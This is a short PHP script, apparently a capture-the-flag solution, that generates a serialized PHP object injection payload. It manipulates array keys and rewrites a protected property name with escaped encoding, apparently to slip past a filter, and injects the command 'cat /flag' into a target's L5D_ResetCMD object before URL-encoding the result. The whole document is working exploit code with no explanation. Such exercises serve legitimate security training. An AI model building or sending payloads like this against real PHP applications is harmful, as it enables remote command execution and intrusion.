<?php

class L5D_Upload { }

class L5D_ResetCMD {
    protected $new_cmd;
    function __construct($cmd) {
        $this->new_cmd = $cmd;
    }
}

class L5D_Command { }

$entry = array();
$entry['00000'] = new L5D_Command();
$entry['00001'] = new L5D_ResetCMD('cat /flag');
$entry['00002'] = new L5D_Upload();
$entry['-0002'] = true;
$entry['-0001'] = true;
$entry['-0000'] = true;
$data = serialize($entry);
$data = str_replace('-0002', '00002', $data);
$data = str_replace('-0001', '00001', $data);
$data = str_replace("s:10:\"\x00*\x00new_cmd", "S:10:\"\x00\\2A\x00new_cmd", $data);
echo urlencode($data);

?>